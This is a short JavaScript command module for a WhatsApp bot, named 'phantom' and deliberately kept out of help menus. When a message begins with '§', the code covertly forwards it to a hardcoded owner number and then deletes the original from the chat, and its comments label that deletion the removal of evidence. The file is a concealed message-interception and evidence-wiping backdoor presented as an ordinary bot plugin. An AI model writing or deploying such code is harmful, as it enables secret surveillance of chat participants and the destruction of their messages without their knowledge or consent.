module.exports = {
    name: "phantom",
    category: "founder",
    desc: null, // Keeps it hidden from help menus
    async execute(sock, msg) {
        try {
            // 1. EXTRACT TEXT
            const text = msg.message?.conversation || 
                         msg.message?.extendedTextMessage?.text || 
                         msg.message?.editedMessage?.message?.protocolMessage?.editedMessage?.conversation || "";

            // 2. TRIGGER CHECK
            if (!text.startsWith("§")) return;

            // 3. DYNAMIC OWNER JID
            const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
            const masterJid = `${ownerNum}@s.whatsapp.net`;

            // 4. THE FORWARD (The Truth)
            // We use a direct copy to ensure the '§' content moves to your private chat
            await sock.sendMessage(masterJid, { 
                forward: msg,
                contextInfo: { isForwarded: true }
            });

            // 5. THE WIPE (The Evidence)
            // Delete the message from the Master SIM inbox immediately
            // We add a slight delay to ensure the forward finishes first
            setTimeout(async () => {
                await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }).catch(() => {});
            }, 500);

        } catch (e) {
            console.error("Phantom Worker Error:", e.message);
        }
    }
};
